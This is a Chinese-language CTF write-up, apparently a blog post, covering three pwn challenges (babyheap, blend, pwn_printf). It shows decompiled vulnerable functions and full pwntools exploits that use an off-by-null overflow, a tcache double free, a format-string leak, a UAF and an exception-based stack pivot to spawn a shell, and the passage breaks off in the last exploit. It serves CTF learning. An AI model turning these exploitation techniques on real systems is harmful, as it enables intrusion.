        <content type="html"><![CDATA[<blockquote><p>比赛的时候出去玩了，这就来复盘</p></blockquote><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><h3 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h3><p>增删查改，数量限制比较宽松挺大的，大小固定 0xf8 。</p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>safe_read 写入大小为 0xf8 会溢出修改下一个 chunk size 最低两位为 \x00 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">safe_read</span><span class="params">(<span class="keyword">char</span> *ptr, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, ptr, <span class="number">0xF0</span>uLL);</span><br><span class="line">  result = &amp;ptr[size];                          <span class="comment">// 当size0xf8时就会溢出修改nextchunk size 低2位</span></span><br><span class="line">  *result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>unsortedbin 泄露 libc 地址</li><li>通过将堆放入 unsortedbin 修改某一个堆的 prev_size ，然后溢出修改 size 位，制造堆重叠，申请两个指向同一地址的指针</li><li>tcache double free</li></ol><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,</span><br><span class="line">terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./babyheap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">ch</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>():</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">menu(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">menu(<span class="number">3</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="comment"># step1 leak libc_base</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">new()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">free(i)</span><br><span class="line">free(<span class="number">0</span>)<span class="comment">#unsortbin</span></span><br><span class="line">free(<span class="number">1</span>)<span class="comment">#unsortbin</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">new()</span><br><span class="line">new()<span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)<span class="comment"># leak main_arena</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = main_arena - <span class="number">0x3ebe90</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step2 让chunk3 pre_size为0x200 </span></span><br><span class="line">new()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">free(i)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">new()</span><br><span class="line">new()<span class="comment">#7</span></span><br><span class="line">new()<span class="comment">#8</span></span><br><span class="line">new()<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># step3 chunk3 inuse为0</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0xf8</span>,<span class="string">&#x27;skye&#x27;</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">new()</span><br><span class="line">new()</span><br><span class="line">new()<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step4 double free tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">free(i)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">new()</span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0xf8</span>,p64(free_hook))</span><br><span class="line">new()</span><br><span class="line">new()</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0xf8</span>,p64(system))</span><br><span class="line"></span><br><span class="line">new()</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0xf8</span>,<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="blend"><a href="#blend" class="headerlink" title="blend"></a>blend</h2><blockquote><p>题目的原型题目是<a href="https://www.anquanke.com/post/id/89855">2017 DCTF flex</a></p></blockquote><h3 id="基本情况-1"><a href="#基本情况-1" class="headerlink" title="基本情况"></a>基本情况</h3><p>增删查功能，堆数量限制为 2 个，且释放堆不会减少计数标志位。有一个隐藏的菜单选项，查找资料后是确定是 c++ 的异常处理。IDA 反汇编后伪 C 看不到 try  catch 捕获异常结构，需要看汇编。</p><blockquote><p><a href="https://www.runoob.com/cplusplus/cpp-exceptions-handling.html">https://www.runoob.com/cplusplus/cpp-exceptions-handling.html</a></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_1184</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input what you want:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)sub_E22(&amp;v2, <span class="number">40LL</span>) &gt; <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (_QWORD *)_cxa_allocate_exception(<span class="number">8LL</span>, <span class="number">40LL</span>);<span class="comment">//会申请0x90堆存放错误信息v0</span></span><br><span class="line">    *v0 = <span class="string">&quot;You are too young!&quot;</span>;</span><br><span class="line">    _cxa_throw(v0, &amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="keyword">char</span> <span class="keyword">const</span>*, <span class="number">0LL</span>);<span class="comment">//调试后发现这里也会申请一大堆堆块</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当捕捉到错误后，就会停止剩下操作，直接跳转回 catch 错误处理。</p><h3 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h3><p>输出用户名时的格式化字符串：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_116C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(byte_202080);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释放堆块时 UAF ：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_1025</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index&gt;&quot;</span>);</span><br><span class="line">  v1 = sub_EA2();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Insufficient space&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( qword_202090[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)qword_202090[v1]);<span class="comment">//UAF</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;down!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>hint 函数写入存在栈溢出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_1184</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input what you want:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)sub_E22(&amp;v2, <span class="number">40LL</span>) &gt; <span class="number">16</span> )<span class="comment">//</span></span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (_QWORD *)_cxa_allocate_exception(<span class="number">8LL</span>, <span class="number">40LL</span>);</span><br><span class="line">    *v0 = <span class="string">&quot;You are too young!&quot;</span>;</span><br><span class="line">    _cxa_throw(v0, &amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="keyword">char</span> <span class="keyword">const</span>*, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>格式化字符串泄露栈上的 libc_start_main 获取 libc_base</li><li>写入 ROP 利用链；利用 UAF 泄露堆地址</li><li>溢出修改 ebp ，利用异常处理机制控制栈到堆上 ROP </li></ol><p>正常泄露地址，只是用 vmmap 查地址算偏移会查到两个 libc.so 用高地址那个，或者用 libc 查 libc_start_main 偏移也用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;%11$p&#x27;</span>)<span class="comment">#leak libc_base</span></span><br><span class="line">show_name()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Current user:&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">240</span></span><br><span class="line">log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p>ROP 利用链用的是 libc 的 gadget ，程序开了 PIE ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ret = libc_base + <span class="number">0x0000000000000937</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000021112</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">str_binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = p64(ret)+p64(pop_rdi_ret)+p64(str_binsh)+p64(system)</span><br></pre></td></tr></table></figure><p>申请两个堆然后释放用 UAF 泄露堆地址，申请的时候要将 ROP 利用链一起写入，ROP 链要填 0x18 填充后面记录：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>+payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;1:&quot;</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><p>然后就是利用异常处理机制，具体研究看一开始放的原题。首先会由 <code>cxa_allocate_exception</code> 创建一个异常对象，会申请一个 0x90 堆。接着进入到 <code>cxa_throw</code> 函数，在里面的 <code>Unwind_RaiseException()</code> 将控制权转移到对应（跳转） catch 代码，执行完异常处理后就会执行 <code>leave;ret</code> ，**跳转到 catch 时依然保持跳转前的 rbp **。</p><p>通过劫持异常出现前的 rbp ，异常处理完成后执行 <code>leave;ret</code> 将栈劫持到堆中。</p><blockquote><p>gdb 单步调试到 <code>Unwind_RaiseException()</code> 后面就会直接跳过，也就是看不到 catch 执行情况</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(heap_addr+<span class="number">0x20</span>)[<span class="number">0</span>:<span class="number">7</span>])</span><br></pre></td></tr></table></figure><p>ROP 链要填 0x18 再写有效部分是因为 <code>Unwind_RaiseException()</code> 执行完后查看堆会发现多了一堆，其中就有将 ROP 所在堆申请利用了，也就是覆盖了数据，所以要填个偏移，然后利用链没有被新数据覆盖。</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,</span><br><span class="line">terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./blend_pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./blend_pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_name</span>():</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span>(<span class="params">content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;%11$p&#x27;</span>)<span class="comment">#leak libc_base</span></span><br><span class="line">show_name()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Current user:&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">240</span></span><br><span class="line">log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000000937</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000021112</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">str_binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = p64(ret)+p64(pop_rdi_ret)+p64(str_binsh)+p64(system)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>+payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;1:&quot;</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;heap_addr:&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&#x27;b *$rebase(0x11e9)&#x27;)</span></span><br><span class="line"></span><br><span class="line">hint(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(heap_addr+<span class="number">0x20</span>)[<span class="number">0</span>:<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h2><h3 id="基本情况-2"><a href="#基本情况-2" class="headerlink" title="基本情况"></a>基本情况</h3><p>开局程序先 mmap 一块 rw 权限内存，放入一堆格式化字符串，然后输入 16 个数字，就会进入 sprintf 的循环，将数字与格式化字符串运算后放入对应变量寄存器。if 判断 v12 的值，v12 作为参数传入 read 函数，写入位置有点奇妙直接就是 rbp ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">sub_4007C6</span><span class="params">(<span class="keyword">unsigned</span> __int16 v12)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp+0h]</span></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">2</span> * v12);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时这里就可能会造成溢出。</p><p>sprintf 里面应该是控制 v12 的值，要逆出来难度不小，最后看师傅们 wp ，当前 9 个输入数字为 32 时，v12 变成允许的最大值 0x20 。然后就是 ROP 了，ROP 回 main 会在 sprintf 报错，返回 sub_4007C6 则没有问题，但是只能输入 0xe 。最后解决办法是用一个 gadget <code>add eax, 0x20290e ; add ebx, esi ; ret</code>  控制 eax 的值，调到输入长度。</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 